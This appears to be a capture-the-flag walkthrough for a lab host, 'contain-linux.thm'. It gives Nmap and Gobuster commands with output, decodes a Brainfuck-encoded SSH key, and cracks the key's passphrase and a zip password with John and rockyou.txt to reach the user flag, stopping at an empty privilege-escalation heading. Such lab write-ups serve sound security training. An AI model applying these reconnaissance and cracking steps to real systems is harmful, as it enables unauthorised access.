# Add `contain-linux.thm` to `/etc/hosts`
Add the target hostname to your attacker machine's `/etc/hosts` file (root required).

`echo "<IPv4 address of target hostname> contain-linux.thm" >> /etc/hosts` (Attacker Machine)
# Active Scanning / Network Discovery
First and foremost, run a full port scan with Nmap to find open ports, services, and versions.

`nmap -A -p- -sC -sV contain-linux.thm` (Attacker Machine)
<pre>
Nmap scan report for contain-linux.thm
Host is up (0.00037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:91:E8:F5:68:F7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/3%OT=22%CT=1%CU=37563%PV=Y%DS=1%DC=D%G=Y%M=0291E8%T
OS:M=6908888E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms contain-linux.thm

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.19 seconds
</pre>
The scan returns an open SSH service on default TCP port 22 and an open HTTP service on default port 80.
# Web Enumeration (Port 80)
Enumerate directories and files on the web server using gobuster.

`gobuster dir -u http://contain-linux.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,txt` (Attacker Machine)
<pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://contain-linux.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,htm,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.htm                 (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 10671]
/user.txt             (Status: 200) [Size: 4372]
/server-status        (Status: 403) [Size: 282]
Progress: 1091375 / 1091380 (100.00%)
===============================================================
Finished
===============================================================
</pre>
This enumeration discovers a file named \<redacted\> on the webroot.
# Decoding File Content
The retrieved file contains encoded data written in the Brainfuck esoteric language. Decode that content using an online decoder.

[Brainfuck Language](https://www.dcode.fr/brainfuck-language) (Attacker Machine)

The decoded string provides a private OpenSSH key. Save the decoded private OpenSSH key in the file `contain-linux.key`.
# Private OpenSSH Key
The private OpenSSH key does not reveal any corresponding user. Thus, use the filename as username during its first usage.

`ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)

The usage of the private OpenSSH key prompt for a passphrase. Convert the private OpenSSH key to a John-compatible hash.

`/opt/john/ssh2john.py contain-linux.key > contain-linux.hash` (Attacker Machine)

Run a wordlist attack with John and `rockyou.txt`.

`john --wordlist=/usr/share/wordlists/rockyou.txt contain-linux.hash` (Attacker Machine)

It takes a long time until John outputs the correct passphrase. Accessing `contain-linux.thm` through the recent ssh command and the descried passphrase succeeds.

`ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)
# `user.txt`
Find and the expected file `user.txt` inside the home directory.

`cat user.txt` (Target Machine)

It reads illegible content rather than the expected user flag. Thus, analyze it thoroughly.

`file user.txt` (Target Machine)

Since it turns out to be a zip file, try to unzip it.

`unzip user.txt` (Attacker Machine)

A password protects the zip file. Hence, convert it to a John-compatible hash.

`/opt/john/zip2john.py user.txt > user.hash` (Attacker Machine)

Run a wordlist attack with John and `rockyou.txt`.

`john --wordlist=/usr/share/wordlists/rockyou.txt user.hash` (Attacker Machine)

Again, it takes a long time until John outputs the correct password. Nonetheless, unzipping `user.txt` extracts `user.txt`, i.e., the archive overwrites itself.

`unzip user.txt` (Attacker Machine)

The extracted `user.txt` file contains the expected user flag.

`cat user.txt` (Attacker Machine)
# Privilege Escalation to root
